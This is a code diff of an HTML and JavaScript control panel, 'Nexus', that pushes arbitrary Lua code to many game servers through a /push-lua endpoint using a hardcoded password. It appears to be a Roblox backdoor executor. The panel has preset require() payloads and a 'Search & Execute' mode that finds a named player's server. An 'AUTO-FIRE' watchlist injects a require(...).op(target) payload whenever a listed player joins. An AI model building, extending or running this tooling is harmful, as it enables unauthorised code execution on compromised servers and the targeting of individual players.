@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Legacy v3.2</title>
+    <title>Nexus  | Final Legacy v3.7</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .panel { background: #1c1c1e; padding: 25px; border-radius: 18px; width: 600px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -24,7 +24,9 @@
         #scan-status { color: #34c759; font-size: 10px; text-align: center; margin-top: 5px; min-height: 12px; font-weight: bold; }
     </style>
 </head>
-<body> <div class="panel">
+<body>
+
+    <div class="panel">
         <div class="tabs">
             <span class="tab active" onclick="openTab(event, 'mass')">Mass</span>
             <span class="tab" onclick="openTab(event, 'single')">Single</span>
@@ -40,9 +42,9 @@
             <div class="btn-group">
                 <button class="pill" onclick="setLua('Darius', 'lua_mass')">Darius</button>
                 <button class="pill" onclick="setLua('Steve', 'lua_mass')">Steve</button>
-                <button class="pill" onclick="setLua('DS', 'lua_mass')">DarkSynapse</button>
+                <button class="pill" onclick="setLua('DS', 'lua_mass')">DS</button>
                 <button class="pill" onclick="setLua('LR', 'lua_mass')">Last Rig</button>
-                <button class="pill" onclick="setLua('EXE', 'lua_mass')">Require.EXE</button>
+                <button class="pill" onclick="setLua('EXE', 'lua_mass')">EXE</button>
             </div>
             <textarea id="lua_mass" rows="5" placeholder="-- Script for ALL nodes"></textarea>
             <button class="exec-btn" onclick="fire('mass')">Execute All Servers</button>
@@ -53,8 +55,9 @@
             <div class="btn-group">
                 <button class="pill" onclick="setLua('Darius', 'lua_single')">Darius</button>
                 <button class="pill" onclick="setLua('LR', 'lua_single')">Last Rig</button>
+                <button class="pill" onclick="setLua('EXE', 'lua_single')">EXE</button>
             </div>
-            <textarea id="lua_single" rows="5" placeholder="-- Script for target (No JobID needed)"></textarea>
+            <textarea id="lua_single" rows="5" placeholder="-- Script for target"></textarea>
             <button class="exec-btn" onclick="findAndExecute()">Search & Execute</button>
         </div>
 
@@ -83,7 +86,7 @@
 
     <div class="footer-btns">
         <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
-        <button class="f-btn" style="color: #ff3b30; font-weight: bold;" onclick="stopAudio()">STOP MUSIC</button>
+        <button class="f-btn" style="color: #ff3b30;" onclick="stopAudio()">STOP MUSIC</button>
     </div>
 
     <audio id="m" loop src="https://files.catbox.moe/81p5wf.mp3"></audio>
@@ -92,10 +95,7 @@
         const audio = document.getElementById('m');
         let watchList = [];
 
-        function stopAudio() {
-            audio.pause();
-            audio.currentTime = 0;
-        }
+        function stopAudio() { audio.pause(); audio.currentTime = 0; }
 
         function openTab(evt, tabName) {
             let i, content, tabs;
@@ -117,22 +117,49 @@
             if(type === 'EXE') box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
         }
 
+        async function push(luaCode, tid) {
+            const payload = { 
+                lua: luaCode, 
+                password: "Alt", 
+                targetId: tid || null 
+            };
+            return fetch('/push-lua', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
         async function findAndExecute() {
             const name = document.getElementById('target_input').value;
             const lua = document.getElementById('lua_single').value;
+            const status = document.getElementById('scan-status');
             if(!name) return alert("Enter a target name!");
             
-            document.getElementById('scan-status').innerText = "Hunting JobID...";
-            const nodes = await (await fetch('/get-games')).json();
-            
-            for (let id in nodes) {
-                if (nodes[id].players?.some(p => p.toLowerCase() === name.toLowerCase())) {
-                    await push(lua, id);
-                    document.getElementById('scan-status').innerText = `SUCCESS: Executed in ${nodes[id].name}`;
-                    return;
+            status.innerText = "Hunting JobID...";
+            try {
+                const res = await fetch('/get-games');
+                const nodes = await res.json();
+                let found = false;
+
+                for (let id in nodes) {
+                    const players = nodes[id].players;
+                    // Support both list of names and just a number
+                    if (Array.isArray(players)) {
+                        if (players.some(p => p.toLowerCase() === name.toLowerCase())) {
+                            status.innerText = `MATCH: Found ${name}! Pushing...`;
+                            await push(lua, id); 
+                            status.innerText = `SUCCESS: Dispatched to ${nodes[id].name}`;
+                            found = true;
+                            break;
+                        }
+                    }
                 }
-            }
-            alert("Player not found.");
+                if(!found) {
+                    status.innerText = "Target not found.";
+                    alert("Player not found in name lists.");
+                }
+            } catch(e) { status.innerText = "Error fetching nodes."; }
         }
 
         function addToWhitelist() {
@@ -147,36 +174,40 @@
 
         async function monitor() {
             if (watchList.length === 0) return;
-            const nodes = await (await fetch('/get-games')).json();
-            for (let id in nodes) {
-                const players = nodes[id].players || [];
-                watchList.forEach(async (target) => {
-                    if (players.some(p => p.toLowerCase() === target.toLowerCase())) {
-                        document.getElementById('scan-status').innerText = `AUTO-FIRE: Found ${target}`;
-                        await push(`require(127445614272366).op("${target}")`, id);
+            try {
+                const res = await fetch('/get-games');
+                const nodes = await res.json();
+                for (let id in nodes) {
+                    const players = nodes[id].players;
+                    if (Array.isArray(players)) {
+                        watchList.forEach(async (target) => {
+                            if (players.some(p => p.toLowerCase() === target.toLowerCase())) {
+                                document.getElementById('scan-status').innerText = `AUTO-FIRE: Found ${target}`;
+                                await push(`require(127445614272366).op("${target}")`, id);
+                            }
+                        });
                     }
-                });
-            }
+                }
+            } catch(e) {}
         }
 
         async function fire(mode) {
             let code = mode === 'mass' ? document.getElementById('lua_mass').value : document.getElementById('lua_inf').value;
             await push(code, null);
-        }
-
-        async function push(lua, tid) {
-            await fetch('/push-lua', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ lua: lua, password: "Alt", targetId: tid })
-            });
+            alert("Dispatched.");
         }
 
         async function refreshNodes() {
             try {
                 const res = await fetch('/get-games');
                 const data = await res.json();
-                document.getElementById('node_log').innerHTML = Object.keys(data).map(k => `<div><b>${data[k].name}</b> (${data[k].players?.length || 0} players)</div>`).join('<hr style="border:0;border-top:1px solid #333">');
+                
+                document.getElementById('node_log').innerHTML = Object.keys(data).map(k => {
+                    const game = data[k];
+                    // FIX: Handle cases where "players" is a number or an array
+                    const count = Array.isArray(game.players) ? game.players.length : (game.players || 0);
+                    return `<div><b>${game.name || "Game"}</b> (${count} players)</div>`;
+                }).join('<hr style="border:0;border-top:1px solid #333">');
             } catch(e) {}
         }
 
